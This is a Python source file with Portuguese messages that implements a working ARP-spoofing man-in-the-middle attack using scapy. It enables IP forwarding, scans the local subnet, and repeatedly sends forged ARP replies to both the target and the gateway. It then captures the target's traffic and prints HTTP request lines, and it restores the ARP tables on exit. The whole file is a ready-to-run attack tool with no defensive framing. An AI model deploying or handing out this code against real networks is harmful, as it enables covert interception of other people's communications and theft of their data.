# arpspoof.py

import socket
import struct
import threading
import time
import sys
from scapy.all import ARP, Ether, srp, send, sniff, get_if_hwaddr
import config as conf
import os

os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

class ARPSpoof:
    def __init__(self, target_ip, gateway_ip=None, interface=None, delay=2):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip or self._get_gateway()
        self.interface = interface
        self.delay = delay
        self.target_mac = None
        self.gateway_mac = None
        self.spoofing = False
        self.packets_captured = 0
        self.stop_sniffing = False
        self.spoof_thread = None
        self.capture_thread = None

    def _get_gateway(self):
        try:
            with open('/proc/net/route') as f:
                for line in f:
                    fields = line.strip().split()
                    if fields[1] != '00000000' or not int(fields[3], 16) & 2:
                        continue
                    return socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))
        except:
            return "192.168.1.1"

    def _get_mac(self, ip):
        try:
            arp_request = ARP(pdst=ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]

            if answered_list:
                return answered_list[0][1].hwsrc
        except Exception as e:
            print(f"{conf.RED}[!] Erro obtendo MAC para {ip}: {e}{conf.RESET}")
        return None

    def discover_network(self):
        network = ".".join(self.target_ip.split(".")[:-1]) + ".0/24"
        print(f"{conf.YELLOW}[*] Descobrindo hosts na rede {network}...{conf.RESET}")
        try:
            arp_request = ARP(pdst=network)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            answered_list = srp(arp_request_broadcast, timeout=3, verbose=False)[0]
            return [{"ip": ans[1].psrc, "mac": ans[1].hwsrc} for ans in answered_list]
        except Exception as e:
            print(f"{conf.RED}[!] Erro na descoberta: {e}{conf.RESET}")
            return []

    def start_spoofing(self):
        print(f"{conf.YELLOW}[*] Iniciando ARP Spoof...{conf.RESET}")
        self.target_mac = self._get_mac(self.target_ip)
        if not self.target_mac:
            print(f"{conf.RED}[!] Não foi possível obter MAC do alvo{conf.RESET}")
            return False

        self.gateway_mac = self._get_mac(self.gateway_ip)
        if not self.gateway_mac:
            print(f"{conf.RED}[!] Não foi possível obter MAC do gateway{conf.RESET}")
            return False

        print(f"{conf.GREEN}[✓] Alvo: {self.target_ip} ({self.target_mac}){conf.RESET}")
        print(f"{conf.GREEN}[✓] Gateway: {self.gateway_ip} ({self.gateway_mac}){conf.RESET}")

        self.spoofing = True
        self.stop_sniffing = False

        self.spoof_thread = threading.Thread(target=self._spoof_loop)
        self.capture_thread = threading.Thread(target=self._capture_packets)

        self.spoof_thread.start()
        self.capture_thread.start()
        return True

    def _spoof_loop(self):
        while self.spoofing:
            try:
                packet1 = ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac,
                              psrc=self.gateway_ip, hwsrc=get_if_hwaddr(self.interface))
                packet2 = ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac,
                              psrc=self.target_ip, hwsrc=get_if_hwaddr(self.interface))
                send(packet1, verbose=False)
                send(packet2, verbose=False)
                time.sleep(self.delay)
            except Exception as e:
                print(f"{conf.RED}[!] Erro no spoofing: {e}{conf.RESET}")
                break

    def _capture_packets(self):
        def packet_handler(packet):
            if packet.haslayer('IP'):
                self.packets_captured += 1
                src_ip = packet['IP'].src
                dst_ip = packet['IP'].dst
                if src_ip == self.target_ip or dst_ip == self.target_ip:
                    protocol = "TCP" if packet.haslayer('TCP') else "UDP" if packet.haslayer('UDP') else "OTHER"
                    if packet.haslayer('TCP') or packet.haslayer('UDP'):
                        src_port = packet[protocol].sport if hasattr(packet[protocol], 'sport') else 'N/A'
                        dst_port = packet[protocol].dport if hasattr(packet[protocol], 'dport') else 'N/A'
                        print(f"{conf.CYAN}[{self.packets_captured:04d}] {conf.GREEN}{protocol}{conf.RESET} "
                              f"{conf.YELLOW}{src_ip}:{src_port}{conf.RESET} → {conf.YELLOW}{dst_ip}:{dst_port}{conf.RESET}")
                    else:
                        print(f"{conf.CYAN}[{self.packets_captured:04d}] {conf.GREEN}{protocol}{conf.RESET} "
                              f"{conf.YELLOW}{src_ip}{conf.RESET} → {conf.YELLOW}{dst_ip}{conf.RESET}")
                    if packet.haslayer('Raw'):
                        payload = packet['Raw'].load.decode('utf-8', errors='ignore')
                        if 'GET' in payload or 'POST' in payload:
                            lines = payload.split('\n')[:3]
                            for line in lines:
                                if line.strip():
                                    print(f"    {conf.PURPLE}HTTP: {line.strip()}{conf.RESET}")

        try:
            print(f"{conf.GREEN}[✓] Iniciando captura de pacotes...{conf.RESET}")
            sniff(filter=f"host {self.target_ip}", prn=packet_handler, store=0,
                  stop_filter=lambda x: self.stop_sniffing)
        except Exception as e:
            print(f"{conf.RED}[!] Erro na captura: {e}{conf.RESET}")

    def stop_spoofing(self):
        print(f"{conf.YELLOW}[*] Parando ARP Spoof e restaurando tabela ARP...{conf.RESET}")
        self.spoofing = False
        self.stop_sniffing = True

        if self.spoof_thread:
            self.spoof_thread.join(timeout=3)
        if self.capture_thread:
            self.capture_thread.join(timeout=3)

        if self.target_mac and self.gateway_mac:
            for _ in range(5):
                packet1 = ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac,
                              psrc=self.gateway_ip, hwsrc=self.gateway_mac)
                packet2 = ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac,
                              psrc=self.target_ip, hwsrc=self.target_mac)
                send(packet1, verbose=False)
                send(packet2, verbose=False)
                time.sleep(0.5)

        print(f"{conf.GREEN}[✓] Tabela ARP restaurada{conf.RESET}")
        print(f"{conf.GREEN}[✓] Total de pacotes capturados: {self.packets_captured}{conf.RESET}")

    def run(self):
        try:
            if self.start_spoofing():
                print(f"{conf.GREEN}[✓] ARP Spoof ativo! Pressione Ctrl+C para parar{conf.RESET}")
                print(f"{conf.PURPLE}{'='*60}{conf.RESET}")
                while True:
                    time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n{conf.YELLOW}[*] Interrompido pelo usuário{conf.RESET}")
        except Exception as e:
            print(f"{conf.RED}[!] Erro durante execução: {e}{conf.RESET}")
        finally:
            self.stop_spoofing()
